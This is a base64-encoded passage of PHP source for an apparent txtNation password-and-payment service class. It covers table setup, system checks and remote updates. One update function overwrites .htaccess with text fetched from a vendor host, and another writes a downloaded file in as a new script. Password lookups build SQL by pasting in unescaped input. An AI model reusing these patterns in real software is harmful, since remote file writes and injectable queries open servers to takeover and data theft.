VyIGNhbiBiZSB1c2VkIHRvIGlkZW50aWZ5IHRoZSBjbGllbnQnLAoJCQkJCQkJCQlgdHJhbnNJRGAgSU5UIE5PVCBOVUxMIENPTU1FTlQgJ1RyYW5zYWN0aW9uIElEIGNhbiBiZSB1c2VkIHRvIGlkZW50aWZ5IHRoaXMgcGF5bWVudCcsCgkJCQkJCQkJCWBjdXJyZW5jeWAgQ0hBUiggMyApIE5PVCBOVUxMIENPTU1FTlQgJ0N1cnJlbmN5IG9mIHRoZSB0cmFuc2FjdGlvbicsCgkJCQkJCQkJCWB0cmFuc1R5cGVgIENIQVIoIDMwICkgTk9UIE5VTEwgLAoJCQkJCQkJCQlgYW1vdW50YCBGTE9BVCBOT1QgTlVMTCBDT01NRU5UICdBbW91bnQgb2YgdGhlIHRyYW5zYWN0aW9uJywKCQkJCQkJCQkJYGNvbmZpcm1lZGAgSU5UKCAxMSApIFVOU0lHTkVEIE5PVCBOVUxMIERFRkFVTFQgJzAnIENPTU1FTlQgJ0lmIHRoZSB1c2VyIGVudGVycyB0aGUgcGFzd29yZCBvbiB0aGUgbWVuYWJsZSB3aW5kb3cgYSBjb25maXJtYXRpb24gcG9zdCB3aWxsIGJlIHNlbnQgdG91cGRhdGUgdGhpcyBmZWlsZCcsCgkJCQkJCQkJCWBkYXRlYCBDSEFSKCAxOSApIE5PVCBOVUxMIENPTU1FTlQgJ0RhdGUgdGhlIHRyYW5zYWN0aW9uIHRvb2sgcGxhY2UnLAoJCQkJCQkJIFVOSVFVRSAoYHBhc3N3b3JkYCkKCQkJCQkJCQkJKSBFTkdJTkUgPSBNWUlTQU0gQ09NTUVOVCA9ICd0eHROYXRpb24gcGFzc3dvcmQgVGFibGUnOyI7CgkJCQoJCQkvKiogQG5vdGUgQ3JlYXRlIG5ldyBkYXRhYmFzZSwgcXVlcnkgZnVuY3Rpb24gd2lsbCBzZW5kIGVycm9yIGNvZGUgTVAtMDExIG9uIGV4Y2VwdGlvbiAqLwoJCQkkdGhpcy0+UXVlcnkoJHN0clNRTCk7CgkJCQoJCQlpZigkdGhpcy0+VGFibGVFeGlzdHMoKSl7CgkJCQkKCQkJCSR0aGlzLT5Qb3N0VmFyVGVzdCgpOwoJCQkJCgkJCQkvKiogQG5vdGUgUmV0dXJuIHN1Y2Nlc3MgcmVzcG9uc2UgJ0FDVElWRScgdG8gYWNrbm93bGVkZ2UgdGhlIHN5c3RlbSBpcyBhY3RpdmVseSByZXNwb25kaW5nIHRvIHJlcXVlc3RzICovCgkJCQkkdGhpcy0+U2NyaXB0U3VjY2VzcygiQUNUSVZFIik7CgkJCX1lbHNlewoJCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDAyJyAqLwoJCQkJJHRoaXMtPlNjcmlwdEVycm9yKCJNUC0wMDIiKTsKCQkJfQoJCQkKCQl9ZWxzZXsKCQkJCgkJCS8qKiBAbm90ZSBVcGdyYWRlIHRoZSB0YWJsZSB3aGVuIHJlcXVpcmVkIGZvciBzZXJ2aWNlIHVwZGF0ZXMgKiovCgkJCSR0aGlzLT5VcGdyYWRlVGFibGUoKTsKCQkJCgkJCS8qKiBAbm90ZSBSZXR1cm4gc3VjY2VzcyByZXNwb25zZSAnQUNUSVZFJyB0byBhY2tub3dsZWRnZSB0aGUgc3lzdGVtIGlzIGFjdGl2bHkgcmVzcG9uZGluZyB0byByZXF1ZXN0cyAqLwoJCQkkdGhpcy0+U2NyaXB0U3VjY2VzcygiQUNUSVZFIik7CgkJfQoJCQoJfQoJCgkvKioKCSAqIEBicmllZiBDaGVja3MgdG8gc2VlIGlmIHRoZSByZXF1aXJlZCBmaWVsZHMgYXJlIGluIHRoZSB0YWJsZSBhbmQgdXBncmFkZXMgb2xkIGluc3RhbGxhdGlvbnMgd29yayB3aXRoIG5ldyBzY3JpcHRzCgkgKiBAdmVyc2lvbiAxLjEuMAoJICogCgkgKiBWZXJzaW9uIEhpc3Rvcnk6CgkgKiAxLjEuMAktCUFkZHMgdGhlIGZlaWxkICdjb25maXJtZWQnLCBmZWlsZCB3YXMgYWRkZWQgaW4gUkEgMS4xLjAKCSAqLwoJZnVuY3Rpb24gVXBncmFkZVRhYmxlKCl7CgkJCgkJLyoqIEBub3RlIENoZWNrIHRvIHNlZSBpZiB0aGUgZmVpbGQgY29uZmlybWVkIGV4aXN0cywgSWYgbm90IHRoZW4gYWx0ZXIgdGhlIHRhYmxlIGFuZCBhZGQgdGhlIG5ldyBmZWlsZCAqKi8KCQkkc3RyU1FMID0gIlNIT1cgRklFTERTCgkJCQkgICBGUk9NIGB7JHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2RhdGFiYXNlJ119YC5geyR0aGlzLT5zdHJUYWJsZU5hbWV9YAoJCQkJICBXSEVSRSBgRmllbGRgID0gJ2NvbmZpcm1lZCciOwoJCQoJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAhJHRoaXMtPk51bVJvd3MoKSl7CgoJCQkvKiogQG5vdGUgRm9yIGV4aXN0aW5nIGNsaWVudHMgd2FudGluZyB0byB1cGRhdGUsIGFsdGVyIHRoZSB0YWJsZSB0byBhZGQgdGhlIG5lc3Nhc2VyeSBmZWlsZCAqKi8KCQkJJHN0clNRTCA9ICJBTFRFUiBUQUJMRSBgeyR0aGlzLT5hcnJDb25maWdEYXRhWydkYXRhYmFzZSddfWAuYHskdGhpcy0+c3RyVGFibGVOYW1lfWAKCQkJCQkJIEFERCBgY29uZmlybWVkYCBJTlQoIDExICkgVU5TSUdORUQgTk9UIE5VTEwgREVGQVVMVCAnMCcgQ09NTUVOVCAnSWYgdGhlIHVzZXIgZW50ZXJzIHRoZSBwYXN3b3JkIG9uIHRoZSBtZW5hYmxlIHdpbmRvdyBhIGNvbmZpcm1hdGlvbiBwb3N0IHdpbGwgYmUgc2VudCB0b3VwZGF0ZSB0aGlzIGZlaWxkJwoJCQkJCSAgIEFGVEVSIGBhbW91bnRgOyI7CgkJCQoJCQkvKiogQG5vdGUgQWx0ZXIgdGhlIHRhYmxlIGlmIHJlcXVpcmVkLCBxdWVyeSBmdW5jdGlvbiB3aWxsIHNlbmQgZXJyb3IgY29kZSBNUC0wMTEgb24gZXhjZXB0aW9uICovCgkJCSR0aGlzLT5RdWVyeSgkc3RyU1FMKTsKCQl9Cgl9CgkKCS8qKgoJICogQGJyaWVmIFBlcmZvcm0gYSBzeXN0ZW0gY2hlY2sgb24gdGhlIGNsaWVudHMgc3lzdGVtIHRvIGNoZWNrIHRoYXQgZGF0YWJhc2UgYWNjZXNzIGFuZCB2YWxpZCBhY2NlcHRhbmNlIG9mIHBvc3RzIGFyZSBhbGwgd29ya2luZyBvawoJICoKCSAqLwoJZnVuY3Rpb24gU3lzdGVtQ2hlY2soKXsKCQkKCQkkdGhpcy0+RGF0YWJhc2VPYmplY3QoKTsKCQkKCQlpZigkdGhpcy0+VGFibGVFeGlzdHMoKSl7CgkJCgkJCSR0aGlzLT5Qb3N0VmFyVGVzdCgpOwoJCQoJCQkvKiogQG5vdGUgUmV0dXJuIHN1Y2Nlc3MgcmVzcG9uc2UgJ0FDVElWRScgdG8gYWNrbm93bGVkZ2UgdGhlIHN5c3RlbSBpcyBhY3RpdmVseSByZXNwb25kaW5nIHRvIHJlcXVlc3RzICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJBQ1RJVkUiKTsKCQl9ZWxzZXsKCQkJLyoqIEBub3RlIFJldHVybiBzdWNjZXNzIHJlc3BvbnNlICdJTkFDVElWRScgdG8gYWxlcnQgdGhhdCB0aGUgc3lzdGVtIHJlcXVpcmVzIHNldHVwICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJJTkFDVElWRSIsZmFsc2UpOwoJCX0KCQkKCX0KCQoJLyoqCgkgKiBAYnJlaWYgQ2hlY2sgdGhhdCB0aGUgdGFibGUgZXhpc3RzIHdpdGhpbiB0aGUgY2xpZW50cyBzeXN0ZW0KCSAqIEB1c2VzIERhdGFiYXNlCgkgKiAKCSAqIEByZXR1cm4gYm9vbGVhbiBSZXR1cm5zICd0cnVlJyBpZiB0aGUgdGFibGUgZXhpc3RzCgkgKi8KCWZ1bmN0aW9uIFRhYmxlRXhpc3RzKCl7CgkJCgkJJGJsUGFzc3dvcmRUYWJsZUV4aXN0cyA9IGZhbHNlOwoJCQoJCS8qKiBAbm90ZSBCdWlsZCBhIHF1ZXJ5IHRvIGNoZWNrIHRhYmxlcyBleGlzdGVuY2UgKi8KCQkkc3RyU1FMID0gIlNIT1cgVEFCTEVTIEZST00gYHskdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXX1gIExJS0UgJ3skdGhpcy0+c3RyVGFibGVOYW1lfSciOwoJCQoJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAkdGhpcy0+TnVtUm93cygpKXsKCQkJCgkJCSRibFBhc3N3b3JkVGFibGVFeGlzdHMgPSB0cnVlOwoJCX0KCQkKCQlyZXR1cm4gJGJsUGFzc3dvcmRUYWJsZUV4aXN0czsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgVGVzdCB0aGUgdmFsaWRpdHkgb2YgdGhlIHBvc3RzIHJlY2VpdmVkIGludG8gdGhlIGNsaWVudHMgc2VydmVyIAoJICoKCSAqLwoJZnVuY3Rpb24gUG9zdFZhclRlc3QoKXsKCQkKCQkkc3RyVGVzdERhdGEgPSBzaGExKCR0aGlzLT5hcnJQb3N0RGF0YVsncGFzc3dkJ10uIk1QVlQyMiIpOwoJCQoJCWlmKCR0aGlzLT5hcnJQb3N0RGF0YVsnc2VjdXJldGVzdCddICE9ICRzdHJUZXN0RGF0YSl7CgkJCS8qKiBAbm90ZSBSZXR1cm4gZXJyb3IgcmVzcG9uc2UgJ01QLTAwNicgKi8KCQkJJHRoaXMtPlNjcmlwdEVycm9yKCJNUC0wMDYiKTsKCQl9CgoJfQoJCgkvKioKCSAqIEBicmllZiBQcm9jZXNzIGFueSBhZGRpdGlvbmFsIGRhdGEgdG8gYmUgcmV0dXJuZWQgYnkgdGhlIHNjcmlwdCBvbiByZXF1ZXN0CgkgKgoJICogQHJldHVybiBzdHJpbmcgcmV0dXJucyBhbnkgYWRkaXRpb25hbCBpbmZvIGFzIGEgc3RyaW5nCgkgKi8KCWZ1bmN0aW9uIFByb2Nlc3NBZGRpdGlvbmFsRGF0YSgpewoJCQoJCSRzdHJPdXRwdXREYXRhID0gIiI7CgkJCgkJaWYoIWlzX251bGwoJHRoaXMtPmFyckFkaXRpb25hbERhdGEpICYmIGlzX2FycmF5KCR0aGlzLT5hcnJBZGl0aW9uYWxEYXRhKSl7CgkJCQoJCQkvKiogQG5vdGUgTG9vcCB0aHJvdWdoIHRoZSBhZGRpdGlvbmFsIGRhdGEgYXJyYXkgYW5kIGV4cG9ydCBhcyBmb3JtYXR0ZWQgc3RyaW5nICovIAoJCQlmb3JlYWNoKCR0aGlzLT5hcnJBZGl0aW9uYWxEYXRhIGFzICRzdHJLZXkgPT4gJHN0clZhbHVlKXsKCQkJCQoJCQkJJHN0ck91dHB1dERhdGEgLj0gIjx7JHN0cktleX0+eyRzdHJWYWx1ZX08L3skc3RyS2V5fT5cbiI7CgkJCQkKCQkJfQoJCQkKCQl9CgkJCgkJcmV0dXJuICRzdHJPdXRwdXREYXRhOwoJfQoJCgkvKioKCSAqIEBicmllZiBHZW5lcmF0ZSBhbGwgc3lzdGVtIGluZm9ybWF0aW9uIHNvIHRoYXQgd2UgY2FuIGtlZXAgdGhlIGNsaWVudCB1cCB0byBkYXRlIGFuZCByZWNlaXZpbmcgYW4gdW5pbnRlcnJ1cHRlZCBzZXJ2aWNlCgkgKiBAdXNlcyBGaWxlIEFjY2VzcwoJICogCgkgKiBAcGFyYW0gYm9vbGVhbiAkYmxQYXNzd29yZENvdW50CgkgKiBAcmV0dXJuIHN0cmluZyByZXR1cm5zIGEgZnVsbCBzeXN0ZW0gaW5mbyByZXBvcnQgYXMgYSBzdHJpbmcKCSAqLwoJZnVuY3Rpb24gUHJvY2Vzc1N5c3RlbUluZm9ybWF0aW9uKCRibFBhc3N3b3JkQ291bnQgPSBmYWxzZSl7CgkJCgkJJHN0ck91dHB1dERhdGEgPSAiIjsKCQkKCQkkc3RyT3V0cHV0RGF0YSAuPSAiPHN5c3RlbS12ZXJzaW9uPnskdGhpcy0+c3RyVmVyc2lvbn08L3N5c3RlbS12ZXJzaW9uPlxuIjsKCQkKCQkkc3RyQ3JlYXRpb25EYXRlID0gZGF0ZSgnRCBqUyBGIFknLGZpbGVjdGltZShfX0ZJTEVfXykpOwoJCSRzdHJPdXRwdXREYXRhIC49ICI8c3lzdGVtLXNldHVwPnskc3RyQ3JlYXRpb25EYXRlfTwvc3lzdGVtLXNldHVwPlxuIjsKCQkKCQlpZigkYmxQYXNzd29yZENvdW50KXsKCQkJJGludFBhc3N3b3JkQ291bnQgPSAkdGhpcy0+Q291bnRQYXNzd29yZHMoKTsKCQkJJHN0ck91dHB1dERhdGEgLj0gIjxzeXN0ZW0tcGFzc3dvcmRzPnskaW50UGFzc3dvcmRDb3VudH08L3N5c3RlbS1wYXNzd29yZHM+XG4iOwoJCX0KCQkKCQkkc3RyVmFsaWRhdGlvbiA9IHNoYTFfZmlsZShfX0ZJTEVfXyk7CgkJJHN0ck91dHB1dERhdGEgLj0gIjxzeXN0ZW0tdmFsaWQ+eyRzdHJWYWxpZGF0aW9ufTwvc3lzdGVtLXZhbGlkPlxuIjsKCQkKCQlpZigkdGhpcy0+Q2hlY2tTZWN1cml0eSgpKXsKCQkJJHN0cklwVmVyc2lvbiA9ICR0aGlzLT5HZXRJcFZlcnNpb24oKTsKCQkJJHN0ck91dHB1dERhdGEgLj0gIjxzeXN0ZW0taXB2ZXJzaW9uPnskc3RySXBWZXJzaW9ufTwvc3lzdGVtLWlwdmVyc2lvbj5cbiI7CgkJCQoJCQkkc3RySXBWYWxpZGF0aW9uID0gc2hhMV9maWxlKCcuaHRhY2Nlc3MnKTsKCQkJJHN0ck91dHB1dERhdGEgLj0gIjxzeXN0ZW0taXB2YWxpZD57JHN0cklwVmFsaWRhdGlvbn08L3N5c3RlbS1pcHZhbGlkPlxuIjsKCQkJCgkJfQoJCQoJCXJldHVybiAkc3RyT3V0cHV0RGF0YTsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgR2V0IGEgdG90YWwgY291bnQgb2YgcGFzc3dvcmRzIHdpdGhpbiB0aGUgY2xpZW50cyBzeXN0ZW0gYW5kIHJldHVybiBjb3VudAoJICogQHVzZXMgRGF0YWJhc2UKCSAqIAoJICogQHJldHVybiBpbnRlZ2VyIHJldHVybnMgYSB0b3RhbCBwYXNzd29yZCBjb3VudAoJICovCglmdW5jdGlvbiBDb3VudFBhc3N3b3JkcygpewoJCQoJCSRpbnRQYXNzd29yZENvdW50ID0gMDsKCQkKCQkvKiogQG5vdGUgQnVpbGQgdGhlIHF1ZXJ5IHRvIGdldCB0aGUgc3RhdHVzIG9mIGEgcGFzc3dvcmQgaW4gdGhlIHBhc3N3b3JkIGRhdGFiYXNlICovCgkJJHN0clNRTCA9ICJTRUxFQ1QgY291bnQoKikgQVMgYHRvdGFsUGFzc3dvcmRzYAoJCQkJCSBGUk9NIGB7JHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2RhdGFiYXNlJ119YC5geyR0aGlzLT5zdHJUYWJsZU5hbWV9YCI7CgkJCgkJaWYoJHRoaXMtPlF1ZXJ5KCRzdHJTUUwpICYmICR0aGlzLT5OdW1Sb3dzKCkpewoJCQkKCQkJJGFyclBhc3N3b3JkQ291bnQgPSAkdGhpcy0+R2V0QXJyYXkoKTsKCQkJCgkJCSRpbnRQYXNzd29yZENvdW50ID0gJGFyclBhc3N3b3JkQ291bnRbJ3RvdGFsUGFzc3dvcmRzJ107CgkJfQoJCQoJCXJldHVybiAkaW50UGFzc3dvcmRDb3VudDsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgR2V0IHRoZSBjdXJyZW50IHZlcnNpb24gb2YgdGhlICcuaHRhY2Nlc3MnIGZpbGUgb24gcHJvdGVjdGluZyB0aGUgcGFzc3dvcmQgc2NyaXB0IG9uIHRoZSBjbGllbnRzIHNlcnZlciBzbyB3ZSBjYW4gaXNzdWUgdXBkYXRlcyBpZiBuZXNzYXNlcnkKCSAqIEB1c2VzIEZpbGUgQWNjZXNzCgkgKiAKCSAqIEByZXR1cm4gc3RyaW5nIHJldHVybnMgdGhlIGN1cnJlbnQgdmVyc2lvbiBudW1iZXIgYXMgYSBzdHJpbmcKCSAqLwoJZnVuY3Rpb24gR2V0SXBWZXJzaW9uKCl7CgkJCgkJJHN0cklwVmVyc2lvbiA9ICJVbmtub3duIjsKCQkKCQlpZigkdGhpcy0+Q2hlY2tTZWN1cml0eSgpKXsKCgkJCSRzdHJIVEFjY2Vzc0RhdGEgPSBmaWxlX2dldF9jb250ZW50cygnLmh0YWNjZXNzJyk7CgkJCQoJCQkvKiogQG5vdGUgR2V0IHRoZSBzZXR1cCBkYXRlIG9mIHRoZSByZW1vdGUgc3lzdGVtICovCgkJCXByZWdfbWF0Y2goIiNcI3ZlcnNpb24oLio/KVxuI3NtIiwkc3RySFRBY2Nlc3NEYXRhLCAkYXJySXBWZXJzaW9uKTsKCQkJCgkJCWlmKCFlbXB0eSgkYXJySXBWZXJzaW9uWzFdKSl7CgkJCQkKCQkJCSRzdHJJcFZlcnNpb24gPSB0cmltKCRhcnJJcFZlcnNpb25bMV0pOwoJCQl9CgkJCQoJCX0KCQkKCQlyZXR1cm4gJHN0cklwVmVyc2lvbjsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgQ2hlY2tzIHRoYXQgdGhlICcuaHRhY2Nlc3MnIHByb3RlY3Rpb24gZXhpc3RzLCB0byBwcm90ZWN0IHVuYXV0aG9yaXNlZCBwYXNzd29yZCBtYW5pcHVsYXRpb24KCSAqIEB1c2VzIEZpbGUgQWNjZXNzCgkgKiAKCSAqIEByZXR1cm4gYm9vbGVhbiBDbGllbnRzIHN5c3RlbSBwcm90ZWN0ZWQgJ3RydWUnCgkgKi8KCWZ1bmN0aW9uIENoZWNrU2VjdXJpdHkoKXsKCQkKCQkkYmxQYXNzU2VjdXJpdHlDaGVjayA9IGZhbHNlOwoJCQoJCWlmKGZpbGVfZXhpc3RzKCcuaHRhY2Nlc3MnKSl7CgkJCQoJCQkkYmxQYXNzU2VjdXJpdHlDaGVjayA9IHRydWU7CgkJfQoJCQoJCXJldHVybiAkYmxQYXNzU2VjdXJpdHlDaGVjazsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgQSBtZXRob2QgdG8gdXBkYXRlIHRoZSBJUCByZXN0cmljdGlvbiBmaWxlcyB3aGVuIHJlcXVpcmVkCgkgKiBAdXNlcyBEYXRhYmFzZQoJICogCgkgKi8KCWZ1bmN0aW9uIFVwZGF0ZUlwUmVzdHJpY3Rpb24oKXsKCQkKCQkkc3RyQ3VycmVudFZlcnNpb24gPSAkdGhpcy0+R2V0SXBWZXJzaW9uKCk7CgkJCgkJJHN0ck5ld0RhdGEgPSBmaWxlX2dldF9jb250ZW50cygiaHR0cHM6Ly9zZWN1cmUudHh0bmF0aW9uLmNvbS9tZW5hYmxlL3VwZGF0ZV9pcC5jbGFzcy5waHA/Y3VycmVudD17JHN0ckN1cnJlbnRWZXJzaW9ufSIpOwoJCQoJCS8qKiBAbm90ZSBHZXQgdGhlIGlwIHVwZGF0ZSByZXNwb25zZSAqLwoJCXByZWdfbWF0Y2goIiM8cmVzcG9uc2U+KC4qPyk8XC9yZXNwb25zZT4jc20iLCRzdHJOZXdEYXRhLCAkYXJyUmVzcG9uc2VUeXBlKTsKCQkKCQlpZigkYXJyUmVzcG9uc2VUeXBlWzFdID09ICJVUERBVEUiKXsKCQkJCgkJCS8qKiBAbm90ZSBHZXQgdGhlIG5ldyBJUCB1cGRhdGUgZmlsZSAqLwoJCQlwcmVnX21hdGNoKCIjPGZpbGU+KC4qPyk8XC9maWxlPiNzbSIsJHN0ck5ld0RhdGEsICRzdHJOZXdBY2Nlc3NEYXRhKTsKCQkJCgkJCSRyZXNJcEZpbGUgPSBmb3BlbignLmh0YWNjZXNzJywndycpOwoJCQkKCQkJZndyaXRlKCRyZXNJcEZpbGUsJHN0ck5ld0FjY2Vzc0RhdGFbMV0pOwoJCQkKCQkJZmNsb3NlKCRyZXNJcEZpbGUpOwoJCQkKCQkJLyoqIEBub3RlIFJldHVybiBzdWNjZXNzIHJlc3BvbnNlICdVUERBVEVEJyB0byBhY2tub3dsZWRnZSB0aGUgc2VjdXJpdHkgc3lzdGVtIGhhcyBiZWVuIHVwZGF0ZWQgKi8KCQkJJHRoaXMtPlNjcmlwdFN1Y2Nlc3MoIlVQREFURUQiKTsKCQl9ZWxzZWlmKCRhcnJSZXNwb25zZVR5cGVbMV0gPT0gIlVQVE9EQVRFIil7CgkJCQoJCQkvKiogQG5vdGUgUmV0dXJuIHN1Y2Nlc3MgcmVzcG9uc2UgJ05PVFJFUVVJUkVEJyB0byBhY2tub3dsZWRnZSB0aGUgc2VjdXJpdHkgc3lzdGVtIGlzIGFscmVhZHkgdXAtdG8tZGF0ZSAqLwoJCQkkdGhpcy0+U2NyaXB0U3VjY2VzcygiTk9UUkVRVUlSRUQiKTsKCQl9ZWxzZXsKCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDEyJyAqLwoJCQkkdGhpcy0+U2NyaXB0RXJyb3IoIk1QLTAxMyIpOwoJCX0KCQkKCX0KCQoJLyoqCgkgKiBAYnJpZWYgQSBtZXRob2QgdG8gdXBkYXRlIHRoZSBtYWluIHNlcnZpY2Ugc2NyaXB0IG9uIHJlcXVlc3QKCSAqIEB1c2VzIERhdGFiYXNlCgkgKiAKCSAqLwoJZnVuY3Rpb24gVXBkYXRlU2VydmljZSgpewoJCQoJCSRzdHJDdXJyZW50VmVyc2lvbiA9ICR0aGlzLT5zdHJWZXJzaW9uOwoJCQoJCSRzdHJOZXdEYXRhID0gZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vc2VjdXJlLnR4dG5hdGlvbi5jb20vbWVuYWJsZS91cGRhdGVfc2VydmljZS5jbGFzcy5waHA/Y3VycmVudD17JHN0ckN1cnJlbnRWZXJzaW9ufSIpOwoJCQoJCS8qKiBAbm90ZSBHZXQgdGhlIFNlcnZpY2UgdXBkYXRlIHJlc3BvbnNlICovCgkJcHJlZ19tYXRjaCgiIzxyZXNwb25zZT4oLio/KTxcL3Jlc3BvbnNlPiNzbSIsJHN0ck5ld0RhdGEsICRhcnJSZXNwb25zZVR5cGUpOwoJCQoJCWlmKCRhcnJSZXNwb25zZVR5cGVbMV0gPT0gIlVQREFURSIpewoJCQkKCQkJLyoqIEBub3RlIEdldCB0aGUgbmV3IFNlcnZpY2UgdXBkYXRlIGZpbGUgKi8KCQkJcHJlZ19tYXRjaCgiIzxmaWxlbmFtZT4oLio/KTxcL2ZpbGVuYW1lPiNzbSIsJHN0ck5ld0RhdGEsICRzdHJOYW1lRGF0YSk7CgkJCQoJCQkvKiogQG5vdGUgR2V0IHRoZSBuZXcgU2VydmljZSB1cGRhdGUgZmlsZSAqLwoJCQlwcmVnX21hdGNoKCIjPGZpbGU+KC4qPyk8XC9maWxlPiNzbSIsJHN0ck5ld0RhdGEsICRzdHJOZXdBY2Nlc3NEYXRhKTsKCgkJCS8vR2V0IHRoZSBzY3JpcHQgbG9jYXRpb24KCQkJJGFyclBhcnRzID0gZXhwbG9kZSgiLyIsX19GSUxFX18pOwoJCQoJCQkkYXJyUGFydHNbY291bnQoJGFyclBhcnRzKSAtIDFdID0gbnVsbDsKCQkJCgkJCSRzdHJQYXRoID0gaW1wbG9kZSgiLyIsJGFyclBhcnRzKTsKCQkJCgkJCS8vQ3JlYXRlIHRoZSBuZXcgZmlsZQoJCQkkcmVzU2VydmljZUZpbGUgPSBmb3Blbigkc3RyUGF0aC4kc3RyTmFtZURhdGFbMV0sJ3cnKTsKCQkJCgkJCWZ3cml0ZSgkcmVzU2VydmljZUZpbGUsaHRtbF9lbnRpdHlfZGVjb2RlKCRzdHJOZXdBY2Nlc3NEYXRhWzFdKSk7CgkJCQoJCQlmY2xvc2UoJHJlc1NlcnZpY2VGaWxlKTsKCQkJCgkJCS8qKiBAbm90ZSBSZXR1cm4gc3Vjc2VzcyByZXNwb25zZSAnVVBEQVRFRCcgdG8gYWNrbm93bGVkZ2UgdGhlIHNlY3VyaXR5IHN5c3RlbSBoYXMgYmVlbiB1cGRhdGVkICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJVUERBVEVEIik7CgkJCQoJCX1lbHNlaWYoJGFyclJlc3BvbnNlVHlwZVsxXSA9PSAiVVBUT0RBVEUiKXsKCQkJCgkJCS8qKiBAbm90ZSBSZXR1cm4gc3Vjc2VzcyByZXNwb25zZSAnTk9UUkVRVUlSRUQnIHRvIGFja25vd2xlZGdlIHRoZSBzZWN1cml0eSBzeXN0ZW0gaXMgYWxyZWFkeSB1cC10by1kYXRlICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJOT1RSRVFVSVJFRCIpOwoJCX1lbHNlewoJCQkvKiogQG5vdGUgUmV0dXJuIGVycm9yIHJlc3BvbnNlICdNUC0wMTQnICovCgkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDE0Iik7CgkJfQoJCQoJfQoJCgkvKioKCSAqIFZhbGlkYXRlIHRoZSBwYXNzd29yZCBhbmQgYSBjb3VudCBvZiB0aGUgdGltZXMgaXQgaGFzIGJlZW4gdXNlZAoJICoKCSAqIEBwYXJhbSBzdHJpbmcgJHN0clBhc3N3b3JkCgkgKiBAcmV0dXJuIGludGVnZXIgQ291bnQgb2YgdGhlIHRpbWVzIHBhc3N3b3JkIGhhcyBiZWVuIHVzZWQKCSAqLwoJZnVuY3Rpb24gVmFsaWRhdGVQYXNzd29yZCgkc3RyUGFzc3dvcmQgPSBudWxsLCAkc3RyVXNlcm5hbWUgPSBudWxsLCAkc3RyUmVmZXJlcklEID0gbnVsbCl7CgkJCgkJJGludFVzZWFnZUNvdW50ID0gZmFsc2U7CgkJCgkJaWYoJHRoaXMtPkNoZWNrUGFzc3dvcmQoJHN0clBhc3N3b3JkKSl7CgkJCQoJCQkkc3RyRXh0cmFXaGVyZUNsYXVzZSA9ICIiOwoJCQkKCQkJaWYoIWlzX251bGwoJHN0clVzZXJuYW1lKSAmJiAkc3RyVXNlcm5hbWUgIT0gIiIpewoJCQkJJHN0ckV4dHJhV2hlcmVDbGF1c2UgLj0gIkFORCBgdXNlcm5hbWVgID0gJ3skc3RyVXNlcm5hbWV9JyI7CgkJCX0KCQkJCgkJCWlmKCFpc19udWxsKCRzdHJSZWZlcmVySUQpICYmICRzdHJSZWZlcmVySUQgIT0gIiIpewoJCQkJJHN0ckV4dHJhV2hlcmVDbGF1c2UgLj0gIkFORCBgcmVmZXJlcmAgPSAneyRzdHJSZWZlcmVySUR9JyI7CgkJCX0KCQkJCgkJCSR0aGlzLT5EYXRhYmFzZU9iamVjdCgpOwoJCQkKCQkJLyoqIEBub3RlIEJ1aWxkIHRoZSBxdWVyeSB0byBnZXQgdGhlIHN0YXR1cyBvZiBhIHBhc3N3b3JkIGluIHRoZSBwYXNzd29yZCBkYXRhYmFzZSAqLwoJCQkkc3RyU1FMID0gIlNFTEVDVCBgc3RhdHVzYAoJCQkJCQkgRlJPTSBgeyR0aGlzLT5hcnJDb25maWdEYXRhWydkYXRhYmFzZSddfWAuYHskdGhpcy0+c3RyVGFibGVOYW1lfWAKCQkJCQkJV0hFUkUgYHBhc3N3b3JkYCA9ICd7JHN0clBhc3N3b3JkfScKCQkJCQkJeyRzdHJFeHRyYVdoZXJlQ2xhdXNlfQoJCQkJCQlMSU1JVCAxIjsKCQkJCgkJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAkdGhpcy0+TnVtUm93cygpKXsKCQkJCQoJCQkJJGFyclBhc3NEYXRhID0gJHRoaXMtPkdldEFycmF5KCk7CgkJCQkKCQkJCSRpbnRVc2VhZ2VDb3VudCA9ICRhcnJQYXNzRGF0YVsnc3RhdHVzJ107CgkJCX0KCQkKCQl9CgkJCgkJcmV0dXJuICRpbnRVc2VhZ2VDb3VudDsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgQWxsb3dzIHRoZSB1c2VyIHRvIHJlZGVlbSBwYXNzd29yZHMgb24gdGhlIGNsaWVudHMgc3lzdGVtLiBNdWx0aXBsZSB1c2VzIG9mIGEgcGFzc3dvcmQgaXMgYXZhaWxhYmxlIGlmIHJlcXVpcmVkCgkgKgoJICogQHBhcmFtIHN0cmluZyAkc3RyUGFzc3dvcmQKCSAqIEBwYXJhbSBpbnRlZ2VyICRpbnRNdWx0aXBsZVVzZXMKCSAqIEByZXR1cm4gYm9vbGVhbgoJICovCglmdW5jdGlvbiBVc2VQYXN3b3JkKCRzdHJQYXNzd29yZCA9IG51bGwsJGludE11bHRpcGxlVXNlcyA9IDEsICRzdHJVc2VybmFtZSA9IG51bGwsICRzdHJSZWZlcmVySUQgPSBudWxsLCAkYmxSZXF1aXJlQ29uZmlybSA9IGZhbHNlKXsKCQkKCQkkYmxTdWNjZXNzZnVseVJlZGVtZWQgPSBmYWxzZTsKCQkKCQlpZigkdGhpcy0+Q2hlY2tQYXNzd29yZCgkc3RyUGFzc3dvcmQpKXsKCQkKCQkJJHRoaXMtPkRhdGFiYXNlT2JqZWN0KCk7CgkJCQoJCQkkaW50UGFzc0NvdW50ID0gJHRoaXMtPlZhbGlkYXRlUGFzc3dv